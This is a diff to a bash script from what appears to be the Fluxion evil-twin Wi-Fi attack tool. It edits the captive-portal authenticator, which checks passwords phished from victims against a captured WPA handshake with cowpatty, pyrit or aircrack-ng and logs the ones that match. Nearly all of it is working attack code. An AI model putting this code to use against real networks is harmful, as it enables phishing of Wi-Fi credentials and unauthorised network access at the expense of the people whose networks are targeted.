@@ -843,18 +843,18 @@ while [ \$AuthenticatorState = \"running\" ]; do
     case "$CaptivePortalAuthenticatorMode" in
       # Cowpatty
       "$CaptivePortalVerificationMethodCowpattyOption")
-        local -r verifiedCondition="cowpatty -f \"$FLUXIONWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$FluxionTargetSSID\" &> $FLUXIONOutputDevice"
+        local -r verifiedCondition="! cowpatty -f \"$FLUXIONWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$FluxionTargetSSID\" &> $FLUXIONOutputDevice"
         ;;
       # Pyrit
       "$CaptivePortalVerificationMethodPyritOption")
-        local -r verifiedCondition="pyrit -r \"$CaptivePortalHashPath\" -i \"$FLUXIONWorkspacePath/candidate.txt\" -b $FluxionTargetMAC attack_passthrough &> $FLUXIONOutputDevice"
+        local -r verifiedCondition="! pyrit -r \"$CaptivePortalHashPath\" -i \"$FLUXIONWorkspacePath/candidate.txt\" -b $FluxionTargetMAC attack_passthrough &> $FLUXIONOutputDevice"
         ;;
 
       *)
         # Aircrack-ng
         # Check if we've got the correct password by looking for
         # anything other than \"Passphrase not in\" or \"KEY NOT FOUND\".
-        local -r verifiedCondition="aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | egrep -qi \"Passphrase not in|KEY NOT FOUND\""
+        local -r verifiedCondition="! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | egrep -qi \"Passphrase not in|KEY NOT FOUND\""
         ;;
     esac
     echo "
@@ -941,9 +941,9 @@ IP: $(captive_portal_get_client_IP)
 \" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
   if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
-#    echo "
-# aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
-#" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    echo "
+ aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
+" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
     echo "
     echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
       " >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
